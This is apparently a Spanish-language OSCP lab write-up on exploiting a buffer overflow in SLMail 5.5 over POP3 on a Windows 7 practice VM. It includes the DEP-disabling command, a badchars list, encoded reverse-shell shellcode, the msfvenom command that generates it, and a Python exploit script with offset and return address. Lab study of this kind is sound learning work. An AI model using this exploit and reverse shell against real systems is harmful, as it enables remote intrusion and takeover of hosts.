---
title: Buffer OverFlow a SLMail 5.5
layout: page
permalink: /bufferOverflow_1er_Practica
---
## Buffer OverFlow a SLMail 5.5.
**Descripción**

En esta publicación detallo mi practica a un Buffer OverFlow usando Python3 para la ejecución remota de comandos RCE a bajo nivel, y persistencia en un sistema Windows 7 de 32 bits.

### Firewall de Windows y reglas de Entrada/Salida - Configuración Parte 1

Lo primero es configurar una maquina Windows para montar el entorno de practica, y es importante que este bien configurado para tener comunicación entre maquinas `(La maquina Windows con el binario vulnerable, y nuestra maquina de atacante).`

> *Se usara un sistema Windows 7 de 32 bits, la versión starter.*

<div style="text-align: center;">
  <img src="/assets/images/BOF-SLMail/W7.png" alt="bof" oncontextmenu="return false;">
</div>

---
Después de instalar la maquina Windows, es muy importante que haya comunicación entre las 2 maquinas mediante trazas **ICMP**, debido a que por defecto estas reglas vienen deshabilitadas, por tanto, para lograr esta configuración debemos ir a la configuración avanzada de firewall de Windows y habilitar las reglas de Entrada/Salida para tener la comunicación por iPv4 y por iPv6.

<div style="text-align: center;">
  <img src="/assets/images/BOF-SLMail/ReglasEntrada.png" alt="bof" oncontextmenu="return false;">
</div>

---
> En la imagen se muestran las reglas de entrada donde hay que habilitar las cuatro reglas para poder recibir una comunicación de nuestra maquina de atacante, de esta forma habrá una comunicación, por tanto hay que repetir el proceso para las reglas de salida.

<div style="text-align: center;">
  <img src="/assets/images/BOF-SLMail/ReglasSalida.png" alt="bof" oncontextmenu="return false;">
</div>

---
Una vez con las reglas habilitadas probamos la comunicación.

<div style="text-align: center;">
  <img src="/assets/images/BOF-SLMail/PruebaPing.png" alt="bof" oncontextmenu="return false;">
</div>

---
Al enviar 4 paquetes y recibirlos confirma que hay comunicación entre maquinas completando el primer paso para dar inicio a la practica del BufferOverflow.

### Desactivar el DEP - Configuración Parte 2

Esta parte es importante, debemos abrir un símbolo del sistema como administrador y ejecutar el siguiente comando.

```bash
bcdedit.exe /set {current} nx AlwaysOff
```

<div style="text-align: center;">
  <img src="/assets/images/BOF-SLMail/DEP.png" alt="bof" oncontextmenu="return false;">
</div>

---
Estamos desactivando el *DEP* `(Data Execution Protection)`, pero para todo el sistema, también se puede hacer para el binario Slmail concretamente desde el apartado GUI, pero al ser una maquina virtual que su único propósito es la practica de BufferOverflow y después será eliminada. La verdad es que no supone ningun problema este comando.

> *Debemos reiniciar el sistema para que se apliquen los cambios* 

### Utilidades - Configuración Parte 3

Para las utilidades se descargaran unas aplicaciones para hacer el trabajo mas cómodo, por tanto, se descargara el binario al cual vamos a atacar *(Slmail_5.5 ya que es vulnerable a BOF)* la aplicación **Inmunity Debugger** para monitorizar todo a bajo nivel.

> Una vez instalado El binario Slmail debemos reiniciar nuestro sistema

Nos vamos a sistema y seguridad, sistema, configuración avanzada del sistema, configuración y prevención de ejecución de datos. Aquí vemos que el *DEP*` (Data Execution Protection)` este deshabilitado.

<div style="text-align: center;">
  <img src="/assets/images/BOF-SLMail/DEPvalidacion.png" alt="bof" oncontextmenu="return false;">
</div>

---
El binario SLmail trabaja en el `puerto 25` y el `puerto 110` que corren esta utilidad.

Para ver la comunicación hay que crear una nueva regla, donde a nivel de protocolo **TCP** hay que especificar los `puertos 25, 110` y permitir la comunicación.

Se procede a instalar la utilidad **mona.py** para trabajar con **Inmunity Debuuger**.

<div style="text-align: center;">
  <img src="/assets/images/BOF-SLMail/mona.png" alt="bof" oncontextmenu="return false;">
</div>

---
> A continuación la vista del script **mona.py** desde el **Inmunity Debugger**.

<div style="text-align: center;">
  <img src="/assets/images/BOF-SLMail/mona2.png" alt="bof" oncontextmenu="return false;">
</div>

---
### Enumeración

Mediante `nmap -sS --min-rate 5000 --open -vvv -n -Pn` obtendremos los resultados del escaneo.

<div style="text-align: center;">
  <img src="/assets/images/BOF-SLMail/nmap.png" alt="bof" oncontextmenu="return false;">
</div>

---
### Badchars

Son necesarios para evitar conflictos al momento de crear nuestra shellcode y que el registro ESP pueda interpretar nuestro código y proporcionarnos nuestra reverse Shell, o el comando que queramos inyectar en el sistema.

```c
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```
### Shellcode
```c
"\xda\xd7\xd9\x74\x24\xf4\xbf\xe4\x1f\x0e\x1c\x5a\x31\xc9"
"\xb1\x52\x83\xc2\x04\x31\x7a\x13\x03\x9e\x0c\xec\xe9\xa2"
"\xdb\x72\x11\x5a\x1c\x13\x9b\xbf\x2d\x13\xff\xb4\x1e\xa3"
"\x8b\x98\x92\x48\xd9\x08\x20\x3c\xf6\x3f\x81\x8b\x20\x0e"
"\x12\xa7\x11\x11\x90\xba\x45\xf1\xa9\x74\x98\xf0\xee\x69"
"\x51\xa0\xa7\xe6\xc4\x54\xc3\xb3\xd4\xdf\x9f\x52\x5d\x3c"
"\x57\x54\x4c\x93\xe3\x0f\x4e\x12\x27\x24\xc7\x0c\x24\x01"
"\x91\xa7\x9e\xfd\x20\x61\xef\xfe\x8f\x4c\xdf\x0c\xd1\x89"
"\xd8\xee\xa4\xe3\x1a\x92\xbe\x30\x60\x48\x4a\xa2\xc2\x1b"
"\xec\x0e\xf2\xc8\x6b\xc5\xf8\xa5\xf8\x81\x1c\x3b\x2c\xba"
"\x19\xb0\xd3\x6c\xa8\x82\xf7\xa8\xf0\x51\x99\xe9\x5c\x37"
"\xa6\xe9\x3e\xe8\x02\x62\xd2\xfd\x3e\x29\xbb\x32\x73\xd1"
"\x3b\x5d\x04\xa2\x09\xc2\xbe\x2c\x22\x8b\x18\xab\x45\xa6"
"\xdd\x23\xb8\x49\x1e\x6a\x7f\x1d\x4e\x04\x56\x1e\x05\xd4"
"\x57\xcb\x8a\x84\xf7\xa4\x6a\x74\xb8\x14\x03\x9e\x37\x4a"
"\x33\xa1\x9d\xe3\xde\x58\x76\xcc\xb7\x62\x96\xa4\xc5\x62"
"\x97\x8f\x43\x84\xfd\xff\x05\x1f\x6a\x99\x0f\xeb\x0b\x66"
"\x9a\x96\x0c\xec\x29\x67\xc2\x05\x47\x7b\xb3\xe5\x12\x21"
"\x12\xf9\x88\x4d\xf8\x68\x57\x8d\x77\x91\xc0\xda\xd0\x67"
"\x19\x8e\xcc\xde\xb3\xac\x0c\x86\xfc\x74\xcb\x7b\x02\x75"
"\x9e\xc0\x20\x65\x66\xc8\x6c\xd1\x36\x9f\x3a\x8f\xf0\x49"
"\x8d\x79\xab\x26\x47\xed\x2a\x05\x58\x6b\x33\x40\x2e\x93"
"\x82\x3d\x77\xac\x2b\xaa\x7f\xd5\x51\x4a\x7f\x0c\xd2\x7a"
"\xca\x0c\x73\x13\x93\xc5\xc1\x7e\x24\x30\x05\x87\xa7\xb0"
"\xf6\x7c\xb7\xb1\xf3\x39\x7f\x2a\x8e\x52\xea\x4c\x3d\x52"
"\x3f"
```

### Código del Script

Para conseguir el shellcode se puede hacer uso de la herramienta **msfvenom**.

> msfvenom -p windows/shell_reverse_tcp LHOST=ip LPORT=443 -a x86 --platform windows -b '\x00\x0a\x0d' -e x86/shikata_ga_nai -f c

El script esta hecho en python3.

<div style="text-align: center;">
  <img src="/assets/images/BOF-SLMail/script.png" alt="bof" oncontextmenu="return false;">
</div>

---
```python
#!/usr/bin/python
# Juan Garcia (aka liandd)
from pwn import *
from struct import pack
import socket, sys

def exploit(ip_address, rport):
    # Escapar el shellcode con b para indicar que son bytes
    shellcode= (b"\ejemplo")

    buffer = b"A" * 2606 + pack("<L", 0x5f4a358f) + b"\x90"*16 + shellcode
    
    p1 = log.progress("Data")
    try:
        p1.status("Enviando %s bytes" % len(buffer))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip_address, rport))
        s.recv(1024)
        s.send(b'USER eva\r\n')
        s.recv(1024)
        s.send(b'PASS ' + buffer + b'\r\n')
        s.recv(1024)
    except Exception as e:
        print("\n[!] Ha habido un error de conexión:", e)
        sys.exit(0)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print ("\n[!] Uso : python " + sys.argv[0] + " <ip-address>\n")
        sys.exit(0)

    ip_address = sys.argv[1]
    rport = 110

    exploit(ip_address, rport)
```

### Conclusión

El Script es compilado y funciona correctamente.

---

Esta publicación ha sido creada como soporte en el aprendizaje de BufferOverFlow para la OSCP.

© Juan David Garcia Acevedo (aka liandd)